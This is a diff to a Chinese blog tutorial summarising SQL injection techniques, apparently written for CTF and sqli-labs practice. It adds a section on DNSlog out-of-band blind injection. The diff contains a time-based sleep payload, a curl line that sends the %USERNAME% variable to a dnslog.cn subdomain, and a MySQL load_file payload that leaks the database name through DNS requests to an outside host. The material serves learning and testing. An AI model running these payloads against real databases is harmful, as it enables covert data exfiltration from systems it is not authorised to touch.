@@ -55,8 +55,14 @@
 <meta property="og:image" content="http://example.com/2022/05/04/sql%E6%B3%A8%E5%85%A5/30.png">
 <meta property="og:image" content="http://example.com/2022/05/04/sql%E6%B3%A8%E5%85%A5/31.png">
 <meta property="og:image" content="http://example.com/2022/05/04/sql%E6%B3%A8%E5%85%A5/32.png">
+<meta property="og:image" content="http://example.com/2022/05/04/sql%E6%B3%A8%E5%85%A5/33.png">
+<meta property="og:image" content="http://example.com/2022/05/04/sql%E6%B3%A8%E5%85%A5/35.png">
+<meta property="og:image" content="http://example.com/2022/05/04/sql%E6%B3%A8%E5%85%A5/34.png">
+<meta property="og:image" content="http://example.com/2022/05/04/sql%E6%B3%A8%E5%85%A5/36.png">
+<meta property="og:image" content="http://example.com/2022/05/04/sql%E6%B3%A8%E5%85%A5/37.png">
+<meta property="og:image" content="http://example.com/2022/05/04/sql%E6%B3%A8%E5%85%A5/38.png">
 <meta property="article:published_time" content="2022-05-03T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-05-06T03:03:10.588Z">
+<meta property="article:modified_time" content="2022-05-09T03:39:26.216Z">
 <meta property="article:author" content="xia0ji233">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2022/05/04/sql%E6%B3%A8%E5%85%A5/1.png">
@@ -499,7 +505,7 @@
 <p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/14.png" alt="14"></p>
 <p>好，到这里我们就把数据库的信息成功获取到了。</p>
 <h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>我们可以看到联合查询注入十分方便，几步到位可以把数据库全部泄露出来，但是利用条件一般比较苛刻，需要有回显点才能实现。</p>
-<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>堆叠注入的原理就是使用引号隔开前一个查询语句，再自己书写另外的 <code>sql</code> 语句以此达到任意执行 <code>sql</code> 语句的目的。由于结果很难回显，我们一般这个用的不多，因为我们主要还是获取信息为主，而不是要去修改它的数据库。</p>
+<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>堆叠注入的原理就是使用引号隔开前一个查询语句，再自己书写另外的 <code>sql</code> 语句以此达到任意执行 <code>sql</code> 语句的目的。由于结果很难回显，我们一般这个用的不多，因为我们主要还是获取信息为主，而不是要去修改它的数据库。</p>
 <p>这个演示我们用 <code>buuctf</code> 里面的一道题吧，是来自2019强网杯的一道题目。</p>
 <p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/15.png" alt="15"></p>
 <p>先不管它怎么说，有提交窗口先正常提交看看它原本的业务逻辑。</p>
@@ -577,6 +583,7 @@
 <ol>
 <li>布尔盲注：如果网站根据有无查找成功，给你返回的有且仅有两个结果。我们的做法一般是，让前面 <code>where</code> 的条件恒为假，再 <code>or</code> 一个自己要判断的语句。或者让前面恒为真，再 <code>and</code> 一个我们要判断的结果，这样的话判断的就是我们想知道的结果了。</li>
 <li>时间盲注：使用一个判断语句，再 <code>and</code> 或 <code>or</code> 一个 <code>sleep</code> 函数，根据是否休眠判断条件是否为真。</li>
+<li>DNSlog盲注：当目标不能打印任何数据库信息，但是可以发起DNS请求的时候可以使用这个方式，这个讲道理不能叫盲注了，因为它能回显数据。</li>
 </ol>
 <p>盲注的特点就是，我一次打过去我最多知道 <code>1bit</code> 的数据，所以盲注手打是非常耗时的，下面我将演示手打和写脚本打。虽然在某些时候 <code>sqlmap</code> 有奇效，但是你得想过，出题人不可能会出一道 <code>sqlmap</code> 能直接跑出答案的题目，所以真材实料还得自己学会。</p>
 <h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>我们打开 <code>sqli-labs-lesson5</code>。</p>
@@ -605,7 +612,8 @@
 <p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/30.png" alt="30"></p>
 <p>可以看到注出这些数据库一共请求了 <code>758</code> 次，而且二分算是效率比较高的了，也许你会说我写的也有问题，范围应该限定在 <code>33-127</code>，但是对于二分来说，范围缩小一半也只是少请求一次而已，整个信息长度 <code>94</code>，我们理论上也就会少请求了 <code>94</code> 次。在经过实际测量之后，发现也是要请求 <code>632</code> 次的，所以盲注是不可能去手打的，一定要学会自己写脚本跑，自己会写能应对任何情况，而你如果一味的依靠 <code>sqlmap</code> 最终会发现吃亏的还是自己。</p>
 <p>布尔盲注一般应用在页面无有关数据库内容的回显，报错也无提示，并且只有两种回显的结果的时候用的。比较万金油，但是会导致请求量很大，实际应用的时候如果限制请求次数那么会很难。</p>
-<h4 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h4><p>这个可以说是最后的法宝了，因为它使用所有的带有注入的页面。如果你的查询请求甚至不会有一点点的回显，比如说登录的时候都不告诉你登录成功或者账号密码失败，这个时候我们就只能使用基于时间的盲注了。</p>
+<p>基于时间的盲注</p>
+<p>这个可以说是最后的法宝了，因为它使用所有的带有注入的页面。如果你的查询请求甚至不会有一点点的回显，比如说登录的时候都不告诉你登录成功或者账号密码失败，这个时候我们就只能使用基于时间的盲注了。</p>
 <p>烫芝士：所有语言的特性—逻辑运算与和或都有这么个特性，两个表达式 <code>and</code>，如果第一个表达式为 <code>0</code> 那么不会运算第二个表达式，两个表达式 <code>or</code>，如果第一个表达式为 <code>1</code> 那么不会计算第二个表达式，两个表达式可以扩展到 <code>n</code> 个表达式。</p>
 <p>基于此，我们给出第一个 <code>payload</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 表达式 and sleep(5)--+</span><br></pre></td></tr></table></figure>
@@ -621,6 +629,63 @@
 <p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/32.png" alt="31"></p>
 <p>可以看到请求次数跟上面是一样的(小声：我偷偷改了ASCII的范围)。并且注出这94个字符我们花费了将近 <code>4min</code>，可以看到这个时间成本也是非常高的。</p>
 <h5 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h5><p>基于时间的盲注基本适用于所有含有注入漏洞的页面，但是时间成本是最高的。</p>
+<h4 id="DNSlog盲注"><a href="#DNSlog盲注" class="headerlink" title="DNSlog盲注"></a>DNSlog盲注</h4><p>以上两个盲注不管是哪个都需要频繁请求数据库才能获取到数据库的具体信息，在当代 <code>WAF</code> 防护如此严密的情况下，请求如此多很可能会导致 <code>ip</code> 被 <code>ban</code>，这里我们可以使用 <code>load_file</code> 来发起一个 <code>DNS</code> 请求。</p>
+<h5 id="前置芝士：mysql读取文件"><a href="#前置芝士：mysql读取文件" class="headerlink" title="前置芝士：mysql读取文件"></a>前置芝士：mysql读取文件</h5><p>先介绍一个函数，之前读写文件的时候用过：<code>load_file(file)</code> 可以读取文件的内容。这里不仅可以读取本地的文件，还能向 <code>url</code> 发起请求。这里需要注意一下数据库的配置，数据库中有一个变量是 <code>secure_file_priv</code>，可以直接查看数据库的配置文件，或者是在 <code>mysql</code> 终端中直接使用命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>来查看这一项配置。</p>
+<ul>
+<li>当 <code>secure_file_priv</code> 为空，就可以读取磁盘的目录。</li>
+<li>当 <code>secure_file_priv</code> 为<code>G:\</code>，就可以读取G盘的文件。</li>
+<li>当 <code>secure_file_priv</code> 为 <code>null</code>，<code>load_file</code> 就不能加载文件。</li>
+</ul>
+<p>所以为了方便，我们最好把 <code>my.ini</code> 文件的该项配置设置成：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">secure_file_priv</span>=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样我们就能任意读取，任意写文件了，但是在生产环境中慎重配置，因为比较危险。</p>
+<p>读取文件的一般形式是 ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(file);</span><br></pre></td></tr></table></figure>
+
+<p>比如我想读取 <code>D:</code> 目录下的 <code>1.txt</code> 文件，那就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;D:/1.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/33.png" alt="33"></p>
+<p>可以发现读取结果以十六进制的方式输出出来了。</p>
+<p>需要注意的是，文件名若以双反斜杠开头则代表向 <code>url</code> 发起请求。</p>
+<p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/35.png" alt="35"></p>
+<p>但是会发现这一请求比较耗时，</p>
+<p>写文件的一般形式是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $information into outfile &quot;$file&quot;</span><br></pre></td></tr></table></figure>
+
+<p>但是不能覆盖文件，只能创建文件。</p>
+<p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/34.png" alt="34"></p>
+<p>在一般情况下，读文件可以读取一些配置文件信息，泄露敏感内容</p>
+<h5 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h5><p>域名解析服务(Domain Name Server)，我们知道 <code>DNS</code> 的作用就是将我们熟知的域名转换成 <code>ip</code> 地址。</p>
+<p>因特网采用层次树状结构命名方法。域是名字空间中一个可被管理的划分（按机构组织划分），域可被划分为子域，子域可再被划分，即形成了顶级域名、二级域名、三级域名等。从右向左为顶级域名、二级域名、三级域名等，用点隔开。</p>
+<p>比如谷歌的域名：<code>www.google.com</code><br>它由三个标号组成， <code>com</code> 即为顶级域名，<code>google</code> 为二级域名，<code>www</code> 即为三级域名,且域名不分区大小写。<br>比如我访问 <code>www.google.com</code> 发生了以下的事情：</p>
+<ol>
+<li>我请求我自己设置的域名服务器</li>
+<li>域名服务器向知道此域名的服务器发起请求</li>
+<li>域名服务器得到了 <code>www.google.com</code> 的 <code>ip</code> 地址，返回给我设置的服务器，最后返回给我。</li>
+</ol>
+<p>我们在域名服务器中就留下了这样一条记录：<code>x.x.x.x</code> 用户在什么时候解析了 <code>www.google.com</code> 的域名。</p>
+<h5 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h5><p>DNSlog是什么。DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名 <code>www.google.com</code> 等的访问信息，类似日志文件。</p>
+<p>假如我在 <code>www.google.com</code> 之后还加了一个子域名，我的请求内容是 <code>xxx.www.google.com</code>，那么此时外部服务器并不知道谷歌在 <code>www</code> 域名下面还有一个子域名，那么它将域名请求发送给谷歌的服务器，谷歌服务器再解析出一个 <code>ip</code> 地址回去给域名服务器，当然也可能没有返回为空，不过这个请求还是会被谷歌的服务记录下来。这样我们的 <code>dns</code> 就会在网站的 <code>dns</code> 服务器留下信息了。</p>
+<p>那么 <code>dnslog</code> 注入就是这么个原理了。它在你请求域名的时候，如果出现了分配给你 <code>dnslog</code> 服务器的日志，就会把数据返回给你。  </p>
+<p>我们先来试试普通的 <code>dnslog</code> 带出信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl %USERNAME%.xxx.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/36.png" alt="36"></p>
+<p>可以看到环境变量被执行带出到我们的 <code>dnslog</code> 服务器里面去了，<code>connection refused</code> 是因为他对所有的子域名解析的服务器地址都是 <code>127.0.0.1</code> 所以你本机没开 <code>web</code> 服务就会这样。</p>
+<p>我们再来试试看在 <code>mysql</code> 里面泄露信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxx.dnslog.cn&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p>我们来试试去请求一下看看。</p>
+<p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/37.png" alt="37"></p>
+<p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/38.png" alt="38"></p>
+<p>可以发现成功泄露信息。</p>
+<p>但是也要注意一下，每级域名长度最长为63，因此每次我们在请求的时候限制一下，用 <code>mid</code> 去截取就好了，虽然发起一次 <code>DNSlog</code> 请求要的时间也很多，但是比盲注要好一点。</p>
+<p>域名若带有特殊字符会导致请求失败，因此在若泄露的信息有特殊符号注意编码一下，用 <code>hex</code> 去编码就好了。</p>
 <h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><code>sql</code> 注入也就学了这么多，暂时先写到这里吧，后续学了新的芝士再来补充。</p>
 
       
@@ -633,7 +698,7 @@
         <p><span>本文标题:</span><a href="/2022/05/04/sql%E6%B3%A8%E5%85%A5/">sql注入总结</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">xia0ji233</a></p>
         <p><span>发布时间:</span>2022-05-04, 00:00:00</p>
-        <p><span>最后更新:</span>2022-05-06, 11:03:10</p>
+        <p><span>最后更新:</span>2022-05-09, 11:39:26</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2022/05/04/sql%E6%B3%A8%E5%85%A5/" title="sql注入总结">http://example.com/2022/05/04/sql%E6%B3%A8%E5%85%A5/</a>
             <span class="copy-path" data-clipboard-text="原文: http://example.com/2022/05/04/sql%E6%B3%A8%E5%85%A5/　　作者: xia0ji233" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -669,7 +734,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB%E6%A1%86%E6%9E%B6"><span class="toc-number">1.</span> <span class="toc-text">WEB框架</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E8%AF%AD%E8%A8%80"><span class="toc-number">2.</span> <span class="toc-text">sql语言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">Mysql常用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">数据库基本信息函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.</span> <span class="toc-text">字符串处理函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">3.3.</span> <span class="toc-text">sql注入常用函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql%E5%86%85%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">4.</span> <span class="toc-text">Mysql内置数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E7%9A%84%E5%85%B6%E5%AE%83%E6%96%B9%E5%BC%8F"><span class="toc-number">5.</span> <span class="toc-text">获得数据库信息的其它方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">6.</span> <span class="toc-text">sqli-labs环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3"><span class="toc-number">7.</span> <span class="toc-text">sql注入详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">7.1.</span> <span class="toc-text">有回显的注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">7.1.1.</span> <span class="toc-text">联合查询的注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">7.1.1.1.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">7.2.</span> <span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">7.2.0.1.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">7.2.1.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">7.2.1.1.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">7.2.2.</span> <span class="toc-text">二次注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.3.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.3.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.3.2.</span> <span class="toc-text">基于时间的盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-3"><span class="toc-number">7.3.2.1.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">小结</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB%E6%A1%86%E6%9E%B6"><span class="toc-number">1.</span> <span class="toc-text">WEB框架</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E8%AF%AD%E8%A8%80"><span class="toc-number">2.</span> <span class="toc-text">sql语言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">Mysql常用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">数据库基本信息函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.</span> <span class="toc-text">字符串处理函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">3.3.</span> <span class="toc-text">sql注入常用函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql%E5%86%85%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">4.</span> <span class="toc-text">Mysql内置数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E7%9A%84%E5%85%B6%E5%AE%83%E6%96%B9%E5%BC%8F"><span class="toc-number">5.</span> <span class="toc-text">获得数据库信息的其它方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">6.</span> <span class="toc-text">sqli-labs环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3"><span class="toc-number">7.</span> <span class="toc-text">sql注入详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">7.1.</span> <span class="toc-text">有回显的注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">7.1.1.</span> <span class="toc-text">联合查询的注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">7.1.1.1.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">7.1.2.</span> <span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">7.1.2.1.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">7.1.3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">7.1.3.1.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">7.1.4.</span> <span class="toc-text">二次注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.2.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.2.1.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-3"><span class="toc-number">7.2.1.1.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNSlog%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.2.2.</span> <span class="toc-text">DNSlog盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E8%8A%9D%E5%A3%AB%EF%BC%9Amysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">7.2.2.1.</span> <span class="toc-text">前置芝士：mysql读取文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DNS"><span class="toc-number">7.2.2.2.</span> <span class="toc-text">DNS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DNSlog"><span class="toc-number">7.2.2.3.</span> <span class="toc-text">DNSlog</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">小结</span></a></li></ol>
         
     </div>
     <style>
